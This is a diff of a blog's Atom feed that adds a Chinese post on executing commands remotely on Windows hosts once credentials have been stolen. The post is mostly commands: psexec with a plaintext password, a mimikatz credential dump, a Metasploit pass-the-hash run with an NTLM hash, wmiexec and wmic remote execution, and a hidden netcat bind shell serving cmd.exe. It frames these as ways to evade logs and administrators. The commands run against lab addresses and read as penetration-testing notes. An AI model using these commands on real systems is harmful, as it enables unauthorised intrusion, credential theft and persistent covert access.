@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://xiaoxiaoxiaoxiaolin.github.io/"/>
-  <updated>2020-01-21T09:50:32.180Z</updated>
+  <updated>2020-01-23T07:06:50.814Z</updated>
   <id>https://xiaoxiaoxiaoxiaolin.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Windows远程执行命令</title>
+    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/bf80d0ef.html/"/>
+    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/bf80d0ef.html/</id>
+    <published>2020-01-23T06:21:17.000Z</published>
+    <updated>2020-01-23T07:06:50.814Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote class="blockquote-center">只愿君心似我心，定不负相思意</blockquote><p>　　当我们已经获取了远程系统的凭证（明文密码或 hash）时，可以直接通过3389远程登录进去收集信息、进行下一步的渗透，但是这样做的话会在系统上留下我们的操作记录，而且有可能邂逅管理员。大部分情况下，一个cmdshell 已经可以满足我们继续渗透的需求，所以不到万不得已的时候最好不要远程桌面连接(mstsc)，而是通过远程执行命令的方式继续开展工作。</p><a id="more"></a><h3 id="psexec-exe远程执行命令"><a href="#psexec-exe远程执行命令" class="headerlink" title="psexec.exe远程执行命令"></a>psexec.exe远程执行命令</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">psexec</span> \\192<span class="selector-class">.168</span><span class="selector-class">.30</span><span class="selector-class">.128</span> <span class="selector-tag">-u</span> <span class="selector-tag">Administrator</span> <span class="selector-tag">-p</span> 123456789 <span class="selector-tag">cmd</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200121181236736.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><p>这里一开始登陆的是另一个管理员账号，但是一直被拒绝访问，后来把Administrator账号取消隐藏，一下就连接上。之后看到一篇文章也有一样的情况，只有Administrator账号才能连接，就算是管理员用户组的其他用户也不能连接，UAC的问题。</p><h3 id="使用Hash登陆Windows"><a href="#使用Hash登陆Windows" class="headerlink" title="使用Hash登陆Windows"></a>使用Hash登陆Windows</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200121181256861.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><p>或者使用wce抓取hash值：</p><p><img src="https://img-blog.csdnimg.cn/20200121181302526.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><p>msf调用payload：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">show <span class="keyword">options</span></span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">192.168.30.128</span></span><br><span class="line"><span class="keyword">Set</span> <span class="comment">SMBPass 0182BD0BD4444BF867CD839BF040D93B:C22B315C040AE6E0EFEE3518D830362B</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUser Administrator</span></span><br><span class="line">show <span class="comment">options</span></span><br><span class="line">Run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200121181313817.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><h3 id="利用wmiexec工具配合进行反弹半交互shell"><a href="#利用wmiexec工具配合进行反弹半交互shell" class="headerlink" title="利用wmiexec工具配合进行反弹半交互shell"></a>利用wmiexec工具配合进行反弹半交互shell</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript<span class="selector-class">.exe</span> <span class="comment">//nologo wmiexec.vbs /shell 192.168.30.128 Administrator 123456789</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020012118132951.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><p>还可以单条命令执行</p><p><img src="https://img-blog.csdnimg.cn/20200121181349926.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><h3 id="WMI执行命令方式，无回显"><a href="#WMI执行命令方式，无回显" class="headerlink" title="WMI执行命令方式，无回显"></a>WMI执行命令方式，无回显</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.30</span>.<span class="number">128</span> /user:Administrator /password:<span class="number">123456789</span>  process call create <span class="string">"cmd.exe /c ipconfig&gt;c:\result.txt"</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020012118140386.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><p>执行成功后可以在被控制的机器里面找到执行结果的文件</p><p><img src="https://img-blog.csdnimg.cn/20200121181405240.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><h3 id="nc远程执行"><a href="#nc远程执行" class="headerlink" title="nc远程执行"></a>nc远程执行</h3><p>先在被控机器上开启监听，-L：让监听者在连接多次掉线时仍坚持监听，-d：让nc隐藏运行，-e：指定要运行的程序，-p：监听的端口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc<span class="selector-class">.exe</span> -L -d -e cmd<span class="selector-class">.exe</span> -<span class="selector-tag">p</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200121181415362.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制端运行<span class="selector-tag">nc64</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.30</span><span class="selector-class">.128</span> 5555</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200121181428164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote class=&quot;blockquote-center&quot;&gt;只愿君心似我心，定不负相思意&lt;/blockquote&gt;&lt;p&gt;　　当我们已经获取了远程系统的凭证（明文密码或 hash）时，可以直接通过3389远程登录进去收集信息、进行下一步的渗透，但是这样做的话会在系统上留下我们的操作记录，而且有可能邂逅管理员。大部分情况下，一个cmdshell 已经可以满足我们继续渗透的需求，所以不到万不得已的时候最好不要远程桌面连接(mstsc)，而是通过远程执行命令的方式继续开展工作。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="Windows" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Windows/"/>
+    
+      <category term="远程命令执行" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>Windows10明文密码抓取</title>
@@ -34,11 +60,11 @@
       <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="mimikatz" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/mimikatz/"/>
+      <category term="Windows" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Windows/"/>
     
       <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
-      <category term="Windows" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Windows/"/>
+      <category term="mimikatz" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/mimikatz/"/>
     
       <category term="密码抓取" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
     
@@ -62,11 +88,11 @@
       <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="mimikatz" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/mimikatz/"/>
+      <category term="Windows" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Windows/"/>
     
       <category term="内网渗透" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
-      <category term="Windows" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/Windows/"/>
+      <category term="mimikatz" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/mimikatz/"/>
     
       <category term="密码抓取" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
     
